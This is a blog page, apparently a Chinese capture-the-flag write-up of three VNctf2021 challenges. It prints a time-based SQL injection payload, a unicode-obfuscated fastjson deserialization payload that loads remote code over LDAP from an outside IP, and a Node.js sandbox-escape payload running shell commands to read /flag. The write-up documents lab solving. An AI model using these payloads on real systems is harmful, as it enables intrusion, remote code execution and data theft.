@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>VNctf2021 - hkk_blog</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
+
+        <script src="../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
+            <div class="container">
+                <a class="navbar-brand" href="../..">hkk_blog</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="navitem">
+                                <a href="../.." class="nav-link">Welcome to hkkblog</a>
+                            </li>
+                            <li class="dropdown active">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Articl <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../DASCTF/" class="dropdown-item">DASCTF</a>
+</li>
+                                    
+<li>
+    <a href="./" class="dropdown-item active">VNctf2021</a>
+</li>
+                                    
+<li>
+    <a href="../%5BHTB%5DDT/" class="dropdown-item">[HTB]Docter</a>
+</li>
+                                    
+<li>
+    <a href="../%5BHTB%5DLaboratory/" class="dropdown-item">[HTB]Laboratory</a>
+</li>
+                                    
+<li>
+    <a href="../docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" class="dropdown-item">docker和phpstorm搭建php开发环境</a>
+</li>
+                                    
+<li>
+    <a href="../isoon/" class="dropdown-item">ISOON</a>
+</li>
+                                    
+<li>
+    <a href="../ssh%E9%9A%A7%E9%81%93/" class="dropdown-item">ssh隧道</a>
+</li>
+                                    
+<li>
+    <a href="../%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="dropdown-item">初探pickle反序列化</a>
+</li>
+                                    
+<li>
+    <a href="../%E5%8F%91%E8%B4%A2writeup/" class="dropdown-item">HXB writeup</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../DASCTF/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../%5BHTB%5DDT/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#vnctf2021" class="nav-link">VNctf2021</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-level="2"><a href="#ez_game" class="nav-link">Ez_game</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#realezjvav" class="nav-link">realezjvav</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#navie" class="nav-link">navie</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="vnctf2021">VNctf2021</h1>
+<h2 id="ez_game">Ez_game</h2>
+<p>是一个用js写的前端小游戏，直接找到初始化的函数将生命和武器调大</p>
+<p><img alt="image-20210316150206190" src="../../img/image-20210316150206190.png" /></p>
+<p>直接调用初始化函数Init()和NextLevel()函数跳关，通关即可</p>
+<p><img alt="image-20210316150206190" src="../../img/image-20210316150647294.png" /></p>
+<h2 id="realezjvav">realezjvav</h2>
+<p>笛卡尔积注入以及fastjson RCE </p>
+<p>进去以后是一个登录页面，提示数据量不大</p>
+<p>猜测是sql注入，fuzz一下</p>
+<p><img alt="image-20210316153519410" src="../../img/image-20210316153519410.png" /></p>
+<p>报错注入，时间注入都被禁了，最终尝试笛卡尔积注入成功</p>
+<p>payload</p>
+<p><code>username=admin&amp;password=1'and if((ascii(substr((select database(),1,1))&lt;200),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),0);#</code></p>
+<p>相应时间大概0.6s，最终跑出密码成功登陆</p>
+<p>查看源码，发现一处可以任意文件读取</p>
+<p><strong><img alt="image-20210316162413676" src="../../img/image-20210316162413676.png" /></strong></p>
+<p>尝试读取springboot的pom.xml</p>
+<p><img alt="image-20210316162558262" src="../../img/image-20210316162558262.png" /></p>
+<p>看到了使用了fastjson，并且该版本有RCE,尝试利用</p>
+<p>利用github上师傅的项目</p>
+<p><code>{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://IP:7777/Exploit","autoCommit":true}}}</code></p>
+<p>发现有过滤，后来大师傅说可以unicode绕过，然后找到P牛星球上的文章</p>
+<p><img alt="image-20210316163016012" src="../../img/image-20210316163016012.png" /></p>
+<p>将部分关键词替换unicode编码</p>
+<p>利用大师傅的项目即可弹shell</p>
+<p>附上链接<code>https://github.com/CaijiOrz/fastjson-1.2.47-RCE</code></p>
+<p>最终payload</p>
+<p><code>{"name":{"\u0040\u0074\u0079\u0070\u0065":"java.lang.Class","val":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","dataSourceName":"ldap://106.15.250.31:1389/Exploit","\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074":true}}}</code></p>
+<h2 id="navie">navie</h2>
+<p>一道js配合re题，web🐶实在不会</p>
+<p>源码奉上</p>
+<pre><code>import express from &quot;express&quot;;
+import bindings from &quot;bindings&quot;;
+import { fileURLToPath } from 'url'
+import path from &quot;path&quot;;
+
+import pkg from 'expression-eval';
+const { eval: eval_, parse } = pkg;
+
+const addon = bindings(&quot;addon&quot;);
+
+const file = fileURLToPath(import.meta.url);
+
+const app = express();
+app.use(express.urlencoded({ extended: true }));
+
+app.use(express.static(&quot;static&quot;));
+
+app.use(&quot;/eval&quot;, (req, res) =&gt; {
+  const e = req.body.e;
+  const code = req.body.code;
+  if (!e || !code) {
+    res.send(&quot;wrong?&quot;);
+    return;
+  }
+  try {
+    if (addon.verify(code)) {
+      res.send(String(eval_(parse(e))));
+    } else {
+      res.send(&quot;wrong?&quot;);
+    }
+  } catch (e) {
+    console.log(e)
+    res.send(&quot;wrong?&quot;);
+  }
+});
+
+app.use(&quot;/source&quot;, (req, res) =&gt; {
+  let p = req.query.path || file;
+  p = path.resolve(path.dirname(file), p);
+  if (p.includes(&quot;flag&quot;)) {
+    res.send(&quot;no flag!&quot;);
+  } else {
+    res.sendFile(p);
+  }
+});
+
+app.use((err, req, res, next) =&gt; {
+  console.log(err)
+  res.redirect(&quot;index.html&quot;);
+});
+
+app.listen(process.env.PORT || 80);
+</code></pre>
+<p>看到导入了一个自己写的模块，并且可以读取文件</p>
+<p>并且说明静态目录为static，可以尝试读取binding.gyp</p>
+<p><img alt="image-20210316171820329" src="../../img/image-20210316171820329.png" /></p>
+<p>或者去读运行的服务也可以读到</p>
+<p><img alt="image-20210316171950805" src="../../img/image-20210316171950805.png" /></p>
+<p>总之我们知道生成了一个addon模块，尝试去读addon模块</p>
+<p>查阅资料知道默认会在./build/Release/下生成.node文件，也就是addon.node</p>
+<p><img alt="image-20210316172158973" src="../../img/image-20210316172158973.png" /></p>
+<p>下载后反编译拿到code(ps:我不会🐶)</p>
+<p>利用constructor构造函数，并利用import动态导入</p>
+<p>发现并无法弹shell，只能利用写入文件读</p>
+<p>payload</p>
+<p><code>e=(1).constructor.constructor("return import('child_process').then(child_process=&gt;{child_process.exec('cat /flag &gt; ./test ')})")();&amp;code=yoshino-s_want_a_gf%2Cqq1735439536</code></p>
+<p><img alt="image-20210316172827716" src="../../img/image-20210316172827716.png" /></p></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js" defer></script>
+        <script src="../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>
+                    From here you can search these documents. Enter
+                    your search terms below.
+                </p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
